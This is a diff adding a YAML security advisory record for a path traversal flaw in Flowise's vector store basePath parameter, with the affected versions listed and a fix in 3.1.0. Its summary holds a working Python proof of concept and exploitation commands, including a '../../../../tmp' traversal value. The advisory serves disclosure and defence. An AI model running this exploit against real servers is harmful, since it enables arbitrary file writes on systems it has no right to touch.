@@ -1,0 +1,306 @@
+advisory_id: GHSA-w6v6-49gh-mc9w
+datasource_id: github_osv/GHSA-w6v6-49gh-mc9w
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-w6v6-49gh-mc9w/GHSA-w6v6-49gh-mc9w.json
+aliases: []
+summary: "Flowise: Path Traversal in Vector Store basePath\n## Summary\n\nThe Faiss and SimpleStore\
+  \ (LlamaIndex) vector store implementations accept a `basePath` parameter from user-controlled\
+  \ input and pass it directly to filesystem write operations without any sanitization. An authenticated\
+  \ attacker can exploit this to write vector store data to arbitrary locations on the server\
+  \ filesystem.\n\n## Vulnerability Details\n\n| Field | Value |\n|-------|-------|\n| Affected\
+  \ File | `packages/components/nodes/vectorstores/Faiss/Faiss.ts` (lines 79, 91) |\n| Affected\
+  \ File | `packages/components/nodes/vectorstores/SimpleStore/SimpleStore.ts` (lines 83-104)\
+  \ |\n\n## Prerequisites\n\n1. **Authentication**: Valid API token with `documentStores:upsert-config`\
+  \ permission\n2. **Document Store**: An existing Document Store with at least one processed\
+  \ chunk\n3. **Embedding Credentials**: Valid embedding provider credentials (e.g., OpenAI\
+  \ API key)\n\n## Root Cause\n\n### Faiss (`Faiss.ts`)\n\n```typescript\nasync upsert(nodeData:\
+  \ INodeData): Promise<Partial<IndexingResult>> {\n    const basePath = nodeData.inputs?.basePath\
+  \ as string  // User-controlled\n    // ...\n    const vectorStore = await FaissStore.fromDocuments(finalDocs,\
+  \ embeddings)\n    await vectorStore.save(basePath)  // Direct filesystem write, no validation\n\
+  }\n```\n\n### SimpleStore (`SimpleStore.ts`)\n\n```typescript\nasync upsert(nodeData: INodeData):\
+  \ Promise<Partial<IndexingResult>> {\n    const basePath = nodeData.inputs?.basePath as string\
+  \  // User-controlled\n    \n    let filePath = ''\n    if (!basePath) filePath = path.join(getUserHome(),\
+  \ '.flowise', 'llamaindex')\n    else filePath = basePath  // Used directly without sanitization\n\
+  \    \n    const storageContext = await storageContextFromDefaults({ persistDir: filePath\
+  \ })  // Writes to arbitrary path\n}\n```\n\n## Impact\n\nAn authenticated attacker can:\n\
+  \n1. **Write files to arbitrary locations** on the server filesystem\n2. **Overwrite existing\
+  \ files** if the process has write permissions\n3. **Potential for code execution** by writing\
+  \ to web-accessible directories or startup scripts\n4. **Data exfiltration** by writing to\
+  \ network-mounted filesystems\n\n## Proof of Concept\n\n### poc.py\n\n```python\n#!/usr/bin/env\
+  \ python3\n\"\"\"\nPOC: Path Traversal in Vector Store basePath (CWE-22)\n\nUsage:\n  python\
+  \ poc.py --target http://localhost:3000 --token <API_KEY> --store-id <STORE_ID> --credential\
+  \ <EMBEDDING_CREDENTIAL_ID>\n\"\"\"\n\nimport argparse\nimport json\nimport urllib.request\n\
+  import urllib.error\n\ndef post_json(url, data, headers):\n    req = urllib.request.Request(\n\
+  \        url,\n        data=json.dumps(data).encode(\"utf-8\"),\n        headers={**headers,\
+  \ \"Content-Type\": \"application/json\"},\n        method=\"POST\",\n    )\n    with urllib.request.urlopen(req,\
+  \ timeout=120) as resp:\n        return resp.status, resp.read().decode(\"utf-8\", errors=\"\
+  replace\")\n\ndef main():\n    ap = argparse.ArgumentParser()\n    ap.add_argument(\"--target\"\
+  , required=True)\n    ap.add_argument(\"--token\", required=True)\n    ap.add_argument(\"\
+  --store-id\", required=True)\n    ap.add_argument(\"--credential\", required=True)\n    ap.add_argument(\"\
+  --base-path\", default=\"/tmp/flowise-path-traversal-poc\")\n    args = ap.parse_args()\n\n\
+  \    payload = {\n        \"storeId\": args.store_id,\n        \"vectorStoreName\": \"faiss\"\
+  ,\n        \"vectorStoreConfig\": {\"basePath\": args.base_path},\n        \"embeddingName\"\
+  : \"openAIEmbeddings\",\n        \"embeddingConfig\": {\"credential\": args.credential},\n\
+  \    }\n\n    url = args.target.rstrip(\"/\") + \"/api/v1/document-store/vectorstore/insert\"\
+  \n    headers = {\"Authorization\": f\"Bearer {args.token}\"}\n\n    try:\n        status,\
+  \ body = post_json(url, payload, headers)\n        print(body)\n    except urllib.error.HTTPError\
+  \ as e:\n        print(e.read().decode())\n\nif __name__ == \"__main__\":\n    main()\n```\n\
+  \n### Setup\n\n1. Create a Document Store in Flowise UI\n2. Add a Document Loader (e.g., Plain\
+  \ Text) with any content\n3. Click \"Process\" to create chunks\n4. Note the Store ID from\
+  \ the URL\n5. Get your embedding credential ID from Settings → Credentials\n\n### Exploitation\n\
+  \n```bash\n# Write to /tmp\npython poc.py \\\n  --target http://127.0.0.1:3000 \\\n  --token\
+  \ <API_TOKEN> \\\n  --store-id <STORE_ID> \\\n  --credential <OPENAI_CREDENTIAL_ID> \\\n \
+  \ --base-path /tmp/flowise-pwned\n\n# Path traversal variant\npython poc.py \\\n  --target\
+  \ http://127.0.0.1:3000 \\\n  --token <API_TOKEN> \\\n  --store-id <STORE_ID> \\\n  --credential\
+  \ <OPENAI_CREDENTIAL_ID> \\\n  --base-path \"../../../../tmp/traversal-test\"\n```\n\n###\
+  \ Evidence\n\n```\n$ python poc.py --target http://127.0.0.1:3000/ --token <TOKEN> --store-id\
+  \ 30af9716-ea51-47e6-af67-5a759a835100 --credential bb1baf6e-acb7-4ea0-b167-59a09a28108f --base-path\
+  \ /tmp/flowise-pwned\n\n{\"numAdded\":1,\"addedDocs\":[{\"pageContent\":\"Lorem Ipsum\",\"\
+  metadata\":{\"docId\":\"d84d9581-0778-454d-984e-42b372b1b555\"}}],\"totalChars\":0,\"totalChunks\"\
+  :0,\"whereUsed\":[]}\n\n$ ls -la /tmp/flowise-pwned/\ntotal 16\ndrwxr-xr-x  4 user  wheel\
+  \   128 Jan 17 12:00 .\ndrwxrwxrwt 12 root  wheel   384 Jan 17 12:00 ..\n-rw-r--r--  1 user\
+  \  wheel  1234 Jan 17 12:00 docstore.json\n-rw-r--r--  1 user  wheel  5678 Jan 17 12:00 faiss.index\n\
+  ```"
+impacted_packages:
+  - purl: pkg:npm/flowise
+    affected_versions: vers:npm/<=3.0.13
+    fixed_versions: vers:npm/3.1.0
+    affected_packages:
+      - pkg:npm/flowise@1.0.0
+      - pkg:npm/flowise@1.0.1
+      - pkg:npm/flowise@1.1.0
+      - pkg:npm/flowise@1.1.1
+      - pkg:npm/flowise@1.2.1
+      - pkg:npm/flowise@1.2.2
+      - pkg:npm/flowise@1.2.3
+      - pkg:npm/flowise@1.2.4
+      - pkg:npm/flowise@1.2.5
+      - pkg:npm/flowise@1.2.6
+      - pkg:npm/flowise@1.2.7
+      - pkg:npm/flowise@1.2.8
+      - pkg:npm/flowise@1.2.9
+      - pkg:npm/flowise@1.2.10
+      - pkg:npm/flowise@1.2.11
+      - pkg:npm/flowise@1.2.12
+      - pkg:npm/flowise@1.2.13
+      - pkg:npm/flowise@1.2.14
+      - pkg:npm/flowise@1.2.15
+      - pkg:npm/flowise@1.2.16
+      - pkg:npm/flowise@1.3.0
+      - pkg:npm/flowise@1.3.1
+      - pkg:npm/flowise@1.3.2
+      - pkg:npm/flowise@1.3.3
+      - pkg:npm/flowise@1.3.4
+      - pkg:npm/flowise@1.3.5
+      - pkg:npm/flowise@1.3.6
+      - pkg:npm/flowise@1.3.7
+      - pkg:npm/flowise@1.3.8-rc.1
+      - pkg:npm/flowise@1.3.8
+      - pkg:npm/flowise@1.3.9
+      - pkg:npm/flowise@1.4.0-rc.1
+      - pkg:npm/flowise@1.4.0
+      - pkg:npm/flowise@1.4.1
+      - pkg:npm/flowise@1.4.2
+      - pkg:npm/flowise@1.4.3
+      - pkg:npm/flowise@1.4.4
+      - pkg:npm/flowise@1.4.5
+      - pkg:npm/flowise@1.4.6
+      - pkg:npm/flowise@1.4.7
+      - pkg:npm/flowise@1.4.8
+      - pkg:npm/flowise@1.4.9
+      - pkg:npm/flowise@1.4.10
+      - pkg:npm/flowise@1.4.11
+      - pkg:npm/flowise@1.4.12
+      - pkg:npm/flowise@1.5.0
+      - pkg:npm/flowise@1.5.1
+      - pkg:npm/flowise@1.6.0
+      - pkg:npm/flowise@1.6.1
+      - pkg:npm/flowise@1.6.2
+      - pkg:npm/flowise@1.6.3
+      - pkg:npm/flowise@1.6.4
+      - pkg:npm/flowise@1.6.5
+      - pkg:npm/flowise@1.6.6
+      - pkg:npm/flowise@1.7.1
+      - pkg:npm/flowise@1.7.2
+      - pkg:npm/flowise@1.8.0
+      - pkg:npm/flowise@1.8.1
+      - pkg:npm/flowise@1.8.2
+      - pkg:npm/flowise@1.8.3
+      - pkg:npm/flowise@1.8.4
+      - pkg:npm/flowise@2.0.0
+      - pkg:npm/flowise@2.0.1
+      - pkg:npm/flowise@2.0.2
+      - pkg:npm/flowise@2.0.3
+      - pkg:npm/flowise@2.0.4
+      - pkg:npm/flowise@2.0.5
+      - pkg:npm/flowise@2.0.6
+      - pkg:npm/flowise@2.0.7
+      - pkg:npm/flowise@2.1.0
+      - pkg:npm/flowise@2.1.1
+      - pkg:npm/flowise@2.1.2
+      - pkg:npm/flowise@2.1.3
+      - pkg:npm/flowise@2.1.4
+      - pkg:npm/flowise@2.1.5
+      - pkg:npm/flowise@2.2.0
+      - pkg:npm/flowise@2.2.1
+      - pkg:npm/flowise@2.2.2
+      - pkg:npm/flowise@2.2.3
+      - pkg:npm/flowise@2.2.4
+      - pkg:npm/flowise@2.2.5
+      - pkg:npm/flowise@2.2.6-hotfix.1
+      - pkg:npm/flowise@2.2.6
+      - pkg:npm/flowise@2.2.7-patch.1
+      - pkg:npm/flowise@2.2.7
+      - pkg:npm/flowise@2.2.8
+      - pkg:npm/flowise@3.0.0
+      - pkg:npm/flowise@3.0.1
+      - pkg:npm/flowise@3.0.2
+      - pkg:npm/flowise@3.0.3
+      - pkg:npm/flowise@3.0.4
+      - pkg:npm/flowise@3.0.5
+      - pkg:npm/flowise@3.0.6
+      - pkg:npm/flowise@3.0.7
+      - pkg:npm/flowise@3.0.8
+      - pkg:npm/flowise@3.0.10
+      - pkg:npm/flowise@3.0.11
+      - pkg:npm/flowise@3.0.12
+      - pkg:npm/flowise@3.0.13
+    fixed_packages:
+      - pkg:npm/flowise@3.1.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:npm/flowise-components
+    affected_versions: vers:npm/<=3.0.13
+    fixed_versions: vers:npm/3.1.0
+    affected_packages:
+      - pkg:npm/flowise-components@1.0.0
+      - pkg:npm/flowise-components@1.1.0
+      - pkg:npm/flowise-components@1.1.1
+      - pkg:npm/flowise-components@1.2.1
+      - pkg:npm/flowise-components@1.2.2
+      - pkg:npm/flowise-components@1.2.3
+      - pkg:npm/flowise-components@1.2.4
+      - pkg:npm/flowise-components@1.2.5
+      - pkg:npm/flowise-components@1.2.6
+      - pkg:npm/flowise-components@1.2.7
+      - pkg:npm/flowise-components@1.2.8
+      - pkg:npm/flowise-components@1.2.9
+      - pkg:npm/flowise-components@1.2.10
+      - pkg:npm/flowise-components@1.2.11
+      - pkg:npm/flowise-components@1.2.12
+      - pkg:npm/flowise-components@1.2.13
+      - pkg:npm/flowise-components@1.2.14
+      - pkg:npm/flowise-components@1.2.15
+      - pkg:npm/flowise-components@1.2.16
+      - pkg:npm/flowise-components@1.2.17
+      - pkg:npm/flowise-components@1.3.0
+      - pkg:npm/flowise-components@1.3.1
+      - pkg:npm/flowise-components@1.3.2
+      - pkg:npm/flowise-components@1.3.3
+      - pkg:npm/flowise-components@1.3.4
+      - pkg:npm/flowise-components@1.3.5-alpha.0
+      - pkg:npm/flowise-components@1.3.5
+      - pkg:npm/flowise-components@1.3.6
+      - pkg:npm/flowise-components@1.3.7
+      - pkg:npm/flowise-components@1.3.8
+      - pkg:npm/flowise-components@1.3.9
+      - pkg:npm/flowise-components@1.3.10
+      - pkg:npm/flowise-components@1.3.11
+      - pkg:npm/flowise-components@1.4.0-rc.1
+      - pkg:npm/flowise-components@1.4.0
+      - pkg:npm/flowise-components@1.4.1
+      - pkg:npm/flowise-components@1.4.2
+      - pkg:npm/flowise-components@1.4.3
+      - pkg:npm/flowise-components@1.4.4
+      - pkg:npm/flowise-components@1.4.5
+      - pkg:npm/flowise-components@1.4.6
+      - pkg:npm/flowise-components@1.4.7
+      - pkg:npm/flowise-components@1.4.8
+      - pkg:npm/flowise-components@1.4.9
+      - pkg:npm/flowise-components@1.5.0
+      - pkg:npm/flowise-components@1.5.1
+      - pkg:npm/flowise-components@1.5.2
+      - pkg:npm/flowise-components@1.5.3
+      - pkg:npm/flowise-components@1.6.0
+      - pkg:npm/flowise-components@1.6.1
+      - pkg:npm/flowise-components@1.6.2
+      - pkg:npm/flowise-components@1.6.3
+      - pkg:npm/flowise-components@1.6.4
+      - pkg:npm/flowise-components@1.6.5
+      - pkg:npm/flowise-components@1.6.6
+      - pkg:npm/flowise-components@1.6.7
+      - pkg:npm/flowise-components@1.6.8
+      - pkg:npm/flowise-components@1.6.9
+      - pkg:npm/flowise-components@1.6.10
+      - pkg:npm/flowise-components@1.7.0
+      - pkg:npm/flowise-components@1.7.1
+      - pkg:npm/flowise-components@1.7.2
+      - pkg:npm/flowise-components@1.8.0
+      - pkg:npm/flowise-components@1.8.1
+      - pkg:npm/flowise-components@1.8.2
+      - pkg:npm/flowise-components@1.8.3
+      - pkg:npm/flowise-components@1.8.4
+      - pkg:npm/flowise-components@1.8.5
+      - pkg:npm/flowise-components@1.8.6
+      - pkg:npm/flowise-components@2.0.0
+      - pkg:npm/flowise-components@2.0.1
+      - pkg:npm/flowise-components@2.0.2
+      - pkg:npm/flowise-components@2.0.3
+      - pkg:npm/flowise-components@2.0.4
+      - pkg:npm/flowise-components@2.0.5
+      - pkg:npm/flowise-components@2.0.6
+      - pkg:npm/flowise-components@2.0.7
+      - pkg:npm/flowise-components@2.1.0
+      - pkg:npm/flowise-components@2.1.1
+      - pkg:npm/flowise-components@2.1.2
+      - pkg:npm/flowise-components@2.1.3
+      - pkg:npm/flowise-components@2.1.4
+      - pkg:npm/flowise-components@2.1.5
+      - pkg:npm/flowise-components@2.2.0
+      - pkg:npm/flowise-components@2.2.1
+      - pkg:npm/flowise-components@2.2.2
+      - pkg:npm/flowise-components@2.2.3
+      - pkg:npm/flowise-components@2.2.4
+      - pkg:npm/flowise-components@2.2.5
+      - pkg:npm/flowise-components@2.2.6
+      - pkg:npm/flowise-components@2.2.7-patch.1
+      - pkg:npm/flowise-components@2.2.7
+      - pkg:npm/flowise-components@2.2.8
+      - pkg:npm/flowise-components@3.0.0
+      - pkg:npm/flowise-components@3.0.1
+      - pkg:npm/flowise-components@3.0.2
+      - pkg:npm/flowise-components@3.0.3
+      - pkg:npm/flowise-components@3.0.4
+      - pkg:npm/flowise-components@3.0.5
+      - pkg:npm/flowise-components@3.0.6
+      - pkg:npm/flowise-components@3.0.7
+      - pkg:npm/flowise-components@3.0.8
+      - pkg:npm/flowise-components@3.0.9
+      - pkg:npm/flowise-components@3.0.10
+      - pkg:npm/flowise-components@3.0.11
+      - pkg:npm/flowise-components@3.0.12
+      - pkg:npm/flowise-components@3.0.13
+    fixed_packages:
+      - pkg:npm/flowise-components@3.1.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '4.9'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:N/VI:L/VA:N/SC:N/SI:H/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-w6v6-49gh-mc9w/GHSA-w6v6-49gh-mc9w.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-22
+references:
+  - url: https://github.com/FlowiseAI/Flowise
+    reference_type:
+    reference_id:
+  - url: https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-w6v6-49gh-mc9w
+    reference_type:
+    reference_id: GHSA-w6v6-49gh-mc9w
+exploits: []
